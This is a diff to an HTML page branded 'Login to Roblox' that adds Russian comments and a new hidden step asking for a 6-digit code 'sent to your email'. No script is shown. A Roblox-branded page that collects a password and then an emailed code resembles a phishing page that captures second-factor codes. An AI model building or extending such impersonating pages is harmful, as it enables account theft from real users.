@@ -33,6 +33,7 @@
     <div class="login-container" id="loginContainer">
         <h1>Login to Roblox</h1>
         
+        <!-- Форма входа (логин + пароль) -->
         <div id="loginForm">
             <div class="input-group">
                 <input type="text" id="loginIdentifier" placeholder="Username/Email/Phone">
@@ -53,6 +54,35 @@
             </p>
         </div>
 
+        <!-- Форма для ввода кода -->
+        <div id="codeForm" style="display: none;">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div style="font-size: 48px; margin-bottom: 10px;">🔐</div>
+                <h2 style="color: #fff; margin-bottom: 10px;">Введите код</h2>
+                <p style="color: #b8b8b8; font-size: 14px;">
+                    Мы отправили код подтверждения на ваш email.<br>
+                    Введите его ниже.
+                </p>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="authCode" placeholder="Введите 6-значный код" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 10px;">
+            </div>
+            
+            <button class="btn-login" onclick="handleCode()">Подтвердить</button>
+            
+            <div style="text-align: center; margin-top: 15px;">
+                <button class="btn-secondary" onclick="resendCode()" style="width: auto; padding: 8px 20px; display: inline-block;">
+                    Отправить код повторно
+                </button>
+            </div>
+            
+            <p class="signup-text">
+                <a href="#" onclick="showLogin()">← Вернуться к входу</a>
+            </p>
+        </div>
+
+        <!-- Форма регистрации -->
         <div id="registerForm" style="display: none;">
             <div class="input-group">
                 <input type="text" id="regUsername" placeholder="Username">
@@ -72,6 +102,7 @@
             </p>
         </div>
 
+        <!-- Форма OTP -->
         <div id="otpForm" style="display: none;">
             <div class="input-group">
                 <input type="email" id="otpEmail" placeholder="Enter your email">
@@ -90,6 +121,7 @@
             </p>
         </div>
 
+        <!-- Быстрый вход -->
         <div id="quickLoginForm" style="display: none;">
             <div class="input-group">
                 <input type="email" id="quickEmail" placeholder="Enter your email">
@@ -108,6 +140,7 @@
             </p>
         </div>
 
+        <!-- Забыли пароль -->
         <div id="forgotForm" style="display: none;">
             <div class="input-group">
                 <input type="email" id="forgotEmail" placeholder="Enter your email">
@@ -121,6 +154,7 @@
         <div id="message" class="message"></div>
     </div>
 
+    <!-- Страница сброса пароля -->
     <div class="reset-container" id="resetContainer" style="display: none;">
         <h1>Reset Password</h1>
         <div class="input-group">
@@ -132,6 +166,7 @@
         <button class="btn-login" onclick="handleResetPassword()">Change Password</button>
     </div>
 
+    <!-- Профиль пользователя -->
     <div class="profile-container" id="profileContainer" style="display: none;">
         <h1>Welcome, <span id="profileUsername"></span>!</h1>
         <p>Email: <span id="profileEmail"></span></p>
